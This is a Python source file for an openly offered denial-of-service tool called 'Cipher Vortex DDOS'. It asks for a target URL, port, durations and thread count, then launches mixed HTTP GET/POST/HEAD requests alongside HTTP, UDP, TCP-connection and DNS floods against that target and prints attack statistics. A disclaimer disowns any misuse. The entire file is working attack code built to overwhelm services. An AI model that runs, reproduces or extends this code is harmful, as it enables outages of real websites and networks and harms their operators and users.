import random
import time
import socket
import asyncio
import aiohttp
import dns.resolver
from concurrent.futures import ThreadPoolExecutor
from ping3 import ping
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, BarColumn, TextColumn
from rich.style import Style
from rich.live import Live
from rich.panel import Panel

console = Console(highlight=False)

class Colors:
    SUCCESS = "bold green"
    ERROR = "bold red"
    WARNING = "bold yellow"
    INFO = "bold cyan"
    DEBUG = "bold blue"
    MAGENTA = "bold magenta"
    WHITE = "bold white"
    HEADER = "bold #FF00FF"
    BANNER = "bold #00FFFF"

Cipher_Vortex_ddos = """
 ██████╗██╗██████╗ ██╗  ██╗███████╗██████╗     ██╗   ██╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗    ██████╗ ██████╗  ██████╗ ███████╗
██╔════╝██║██╔══██╗██║  ██║██╔════╝██╔══██╗    ██║   ██║██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║     ██║██████╔╝███████║█████╗  ██████╔╝    ██║   ██║██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝     ██║  ██║██║  ██║██║   ██║███████╗
██║     ██║██╔═══╝ ██╔══██║██╔══╝  ██╔══██╗    ╚██╗ ██╔╝██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗     ██║  ██║██║  ██║██║   ██║╚════██║
╚██████╗██║██║     ██║  ██║███████╗██║  ██║     ╚████╔╝ ╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗    ██████╔╝██████╔╝╚██████╔╝███████║
 ╚═════╝╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝      ╚═══╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
"""

toolname = "Cipher Vortex DDOS - V2.0.0"
creator = "Created by Cipher security"
channel = "Telegram: @Cipher_security"
github = "github: Cipher1security"
disclaimer = "[!] We are not responsible for any misuse of this tool !"

stats = {
    'total_requests': 0,
    'successful_requests': 0,
    'failed_requests': 0,
    'get_requests': 0,
    'post_requests': 0,
    'head_requests': 0,
    'http_floods': 0,
    'udp_floods': 0,
    'tcp_floods': 0,
    'dns_floods': 0,
    'start_time': 0,
    'end_time': 0
}

def log_message(message, msg_type="INFO"):
    """Log messages with consistent styling"""
    color_map = {
        "SUCCESS": Colors.SUCCESS,
        "ERROR": Colors.ERROR,
        "WARNING": Colors.WARNING,
        "INFO": Colors.INFO,
        "DEBUG": Colors.DEBUG,
        "HEADER": Colors.HEADER
    }
    
    style = color_map.get(msg_type, Colors.WHITE)
    prefix = {
        "SUCCESS": "[+]",
        "ERROR": "[-]",
        "WARNING": "[!]",
        "INFO": "[*]",
        "DEBUG": "[DEBUG]",
        "HEADER": "[#]"
    }.get(msg_type, "")
    
    console.print(f"{prefix} {message}", style=style)

async def test_connection(base_url, port):
    domain = base_url.split("//")[1].split("/")[0]
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((domain, port))
        sock.close()
        response_time = ping(domain)
        if response_time is not None:
            log_message(f"Connection to {domain}:{port} successful! Ping: {response_time * 1000:.2f} ms", "SUCCESS")
        else:
            log_message(f"Connection to {domain}:{port} successful (ping failed)", "SUCCESS")
        return response_time
    except Exception as e:
        log_message(f"Failed to connect to {domain}:{port} - {e}", "ERROR")
        return None

async def send_get_request(url, retries=3):
    async with aiohttp.ClientSession() as session:
        for attempt in range(retries):
            try:
                async with session.get(url) as response:
                    stats['successful_requests'] += 1
                    stats['get_requests'] += 1
                    log_message(f"GET Requested URL: {url} - Status Code: {response.status}", "INFO")
                    return True
            except Exception as e:
                log_message(f"Error requesting {url}: {e} (Attempt {attempt+1}/{retries})", "ERROR")
                await asyncio.sleep(0.5)
        stats['failed_requests'] += 1
        return False


async def send_post_request(url):
    async with aiohttp.ClientSession() as session:
        try:
            data = {"key": "value" * 1000}  
            async with session.post(url, data=data) as response:
                stats['successful_requests'] += 1
                stats['post_requests'] += 1
                log_message(f"POST Requested URL: {url} - Status Code: {response.status}", "INFO")
                return True
        except Exception as e:
            stats['failed_requests'] += 1
            log_message(f"Error requesting {url}: {e}", "ERROR")
            return False

async def send_head_request(url):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.head(url) as response:
                stats['successful_requests'] += 1
                stats['head_requests'] += 1
                log_message(f"HEAD Requested URL: {url} - Status Code: {response.status}", "INFO")
                return True
        except Exception as e:
            stats['failed_requests'] += 1
            log_message(f"Error requesting {url}: {e}", "ERROR")
            return False

async def http_flood(url, duration):
    stats['http_floods'] += 1
    end_time = time.time() + duration
    while time.time() < end_time:
        success = await send_get_request(url)
        if success:
            stats['successful_requests'] += 1
        else:
            stats['failed_requests'] += 1
        await asyncio.sleep(0.01)

def udp_flood(target_ip, target_port, duration):
    stats['udp_floods'] += 1
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)  
    end_time = time.time() + duration
    packets_sent = 0

    try:
        while time.time() < end_time:
            sock.sendto(bytes, (target_ip, target_port))
            packets_sent += 1
            if packets_sent % 10 == 0:
                log_message(f"UDP Flooding {target_ip}:{target_port} - Packets: {packets_sent}", "DEBUG")
            time.sleep(0.01)
    except Exception as e:
        log_message(f"UDP Error: {e}", "ERROR")
    finally:
        sock.close()
        stats['successful_requests'] += packets_sent
        log_message(f"UDP Flood completed. Total packets sent: {packets_sent}", "SUCCESS")

def tcp_connection_flood(target_ip, target_port, duration):
    stats['tcp_floods'] += 1
    end_time = time.time() + duration
    connections_made = 0

    try:
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target_ip, target_port))
                sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
                connections_made += 1
                if connections_made % 5 == 0:
                    log_message(f"TCP Connection to {target_ip}:{target_port} - Connections: {connections_made}", "DEBUG")
                sock.close()
                time.sleep(0.1)
            except (ConnectionResetError, ConnectionAbortedError) as e:
                log_message(f"TCP connection forcibly closed: {e}", "WARNING")
                time.sleep(1)
            except Exception as e:
                log_message(f"TCP Error: {e}", "ERROR")
                time.sleep(0.5)
    finally:
        stats['successful_requests'] += connections_made
        log_message(f"TCP Flood completed. Total connections made: {connections_made}", "SUCCESS")

def dns_flood(url, duration):
    stats['dns_floods'] += 1
    domain = url.split("//")[1].split("/")[0]
    resolver = dns.resolver.Resolver()
    end_time = time.time() + duration
    queries_sent = 0

    try:
        while time.time() < end_time:
            try:
                resolver.resolve(domain, 'A')
                queries_sent += 1
                if queries_sent % 10 == 0:
                    log_message(f"DNS Query to {domain} - Queries: {queries_sent}", "DEBUG")
                time.sleep(0.1)
            except Exception as e:
                log_message(f"DNS Error: {e}", "ERROR")
                time.sleep(0.5)
    finally:
        stats['successful_requests'] += queries_sent
        log_message(f"DNS Flood completed. Total queries sent: {queries_sent}", "SUCCESS")

def validate_url(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        log_message("Invalid URL. Please ensure it starts with http:// or https://.", "ERROR")
        return False
    return True

def validate_positive_integer(value):
    try:
        ivalue = int(value) 
        if ivalue < 0:
            log_message("Please enter a non-negative integer.", "ERROR")
            return False
        return ivalue
    except ValueError:
        log_message("Invalid input. Please enter a valid integer.", "ERROR")
        return False

def validate_port(port):
    try:
        port = int(port)
        if 1 <= port <= 65535:
            return port
        else:
            log_message("Port must be between 1 and 65535.", "ERROR")
            return False
    except ValueError:
        log_message("Invalid port number. Please enter a valid integer.", "ERROR")
        return False

def show_final_stats():
    total_time = stats['end_time'] - stats['start_time']
    success_rate = (stats['successful_requests'] / stats['total_requests'] * 100) if stats['total_requests'] > 0 else 0
    req_per_sec = stats['total_requests'] / total_time if total_time > 0 else 0
    
    table = Table(
        title="Attack Statistics",
        show_header=True,
        header_style=Colors.HEADER,
        border_style=Colors.INFO,
        title_style=Colors.BANNER
    )
    
    table.add_column("Metric", style=Colors.INFO, justify="left")
    table.add_column("Value", style=Colors.SUCCESS, justify="right")
    
    table.add_row("Total Requests", f"{stats['total_requests']:,}")
    table.add_row("Successful Requests", f"{stats['successful_requests']:,}", style=Colors.SUCCESS)
    table.add_row("Failed Requests", f"{stats['failed_requests']:,}", style=Colors.ERROR if stats['failed_requests'] > 0 else Colors.SUCCESS)
    table.add_row("Success Rate", f"{success_rate:.2f}%", 
                 style=Colors.SUCCESS if success_rate > 90 else Colors.WARNING if success_rate > 50 else Colors.ERROR)
    table.add_row("Total Time", f"{total_time:.2f} seconds")
    table.add_row("Requests/Second", f"{req_per_sec:,.2f}")
    
    table.add_row("---", "---")
    table.add_row("GET Requests", f"{stats['get_requests']:,}")
    table.add_row("POST Requests", f"{stats['post_requests']:,}")
    table.add_row("HEAD Requests", f"{stats['head_requests']:,}")
    
    table.add_row("---", "---")
    table.add_row("HTTP Floods", f"{stats['http_floods']:,}")
    table.add_row("UDP Floods", f"{stats['udp_floods']:,}")
    table.add_row("TCP Floods", f"{stats['tcp_floods']:,}")
    table.add_row("DNS Floods", f"{stats['dns_floods']:,}")
    
    console.print(Panel.fit(table, title="Final Statistics", border_style=Colors.BANNER))

async def main():
    console.print(Cipher_Vortex_ddos, style=Colors.BANNER)
    console.print(Panel.fit(toolname, style=Colors.HEADER))
    console.print(Panel.fit("\n".join([creator, channel, github]), style=Colors.INFO))
    console.print(Panel.fit(disclaimer, style=Colors.ERROR))

    base_url = input("Enter the base URL (e.g., https://example.com): ")
    if not validate_url(base_url):
        return

    while True:
        port = input("Enter the target port number (1-65535): ")
        port = validate_port(port)
        if port is not False:
            break

    domain = base_url.split("//")[1].split("/")[0]
    try:
        ip_address = socket.gethostbyname(domain)
        log_message(f"IP Address of {domain}: {ip_address}", "INFO")
    except socket.gaierror:
        log_message(f"Could not resolve IP address for {domain}", "ERROR")
        return

    ping_time = await test_connection(base_url, port)

    while True:
        number_of_requests = input("Enter the number of requests to send (0 to exit): ")
        number_of_requests = validate_positive_integer(number_of_requests)
        if number_of_requests is not False:
            if number_of_requests == 0:
                log_message("Exiting...", "INFO")
                return
            break
    
    while True:
        delay = input("Enter the delay between requests (in seconds): ")
        delay = validate_positive_integer(delay)
        if delay is not False:
            break

    while True:
        udp_duration = input("Enter the duration for UDP flood (in seconds): ")
        udp_duration = validate_positive_integer(udp_duration)
        if udp_duration is not False:
            break

    while True:
        http_duration = input("Enter the duration for HTTP flood (in seconds): ")
        http_duration = validate_positive_integer(http_duration)
        if http_duration is not False:
            break

    while True:
        tcp_duration = input("Enter the duration for TCP flood (in seconds): ")
        tcp_duration = validate_positive_integer(tcp_duration)
        if tcp_duration is not False:
            break

    while True:
        dns_duration = input("Enter the duration for DNS flood (in seconds): ")
        dns_duration = validate_positive_integer(dns_duration)
        if dns_duration is not False:
            break

    while True:
        num_threads = input("Enter the number of threads to use (1-100): ")
        num_threads = validate_positive_integer(num_threads)
        if num_threads is not False and 1 <= num_threads <= 100:
            break
        else:
            log_message("Please enter a number between 1 and 100.", "ERROR")

    request_types = ['GET', 'POST', 'HEAD', 'HTTP_FLOOD', 'UDP_FLOOD', 'TCP_FLOOD', 'DNS_FLOOD']
    stats['start_time'] = time.time()
    stats['total_requests'] = number_of_requests

    progress_columns = [
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=None),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TextColumn("•"),
        TextColumn("[cyan]Req: {task.completed}/{task.total}"),
        TextColumn("•"),
        TextColumn("[green]Success: {task.fields[success]}"),
        TextColumn("•"),
        TextColumn("[red]Failed: {task.fields[fail]}"),
    ]

    with Progress(*progress_columns) as progress:
        task = progress.add_task(
            "[cyan]Attacking...",
            total=number_of_requests,
            success=0,
            fail=0
        )
        
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            tasks = []
            for i in range(number_of_requests):
                random_type = random.choice(request_types)
                
                if random_type == 'GET':
                    tasks.append(asyncio.ensure_future(send_get_request(base_url)))
                elif random_type == 'POST':
                    tasks.append(asyncio.ensure_future(send_post_request(base_url)))
                elif random_type == 'HEAD':
                    tasks.append(asyncio.ensure_future(send_head_request(base_url)))
                elif random_type == 'HTTP_FLOOD':
                    tasks.append(asyncio.ensure_future(http_flood(base_url, http_duration)))
                elif random_type == 'UDP_FLOOD':
                    executor.submit(udp_flood, ip_address, port, udp_duration)
                elif random_type == 'TCP_FLOOD':
                    executor.submit(tcp_connection_flood, ip_address, port, tcp_duration)
                elif random_type == 'DNS_FLOOD':
                    executor.submit(dns_flood, base_url, dns_duration)

                progress.update(
                    task,
                    advance=1,
                    success=stats['successful_requests'],
                    fail=stats['failed_requests']
                )
                await asyncio.sleep(delay)

            await asyncio.gather(*tasks)

    stats['end_time'] = time.time()
    show_final_stats()
    
    if ping_time is not None:
        log_message(f"Final Ping Time: {ping_time * 1000:.2f} ms", "INFO")
    else:
        log_message("Unable to determine final ping time.", "WARNING")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log_message("Attack interrupted by user. Showing current statistics...", "WARNING")
        stats['end_time'] = time.time()
        show_final_stats()
    except Exception as e:
        log_message(f"Unexpected error: {e}", "ERROR")
        stats['end_time'] = time.time()
        show_final_stats()
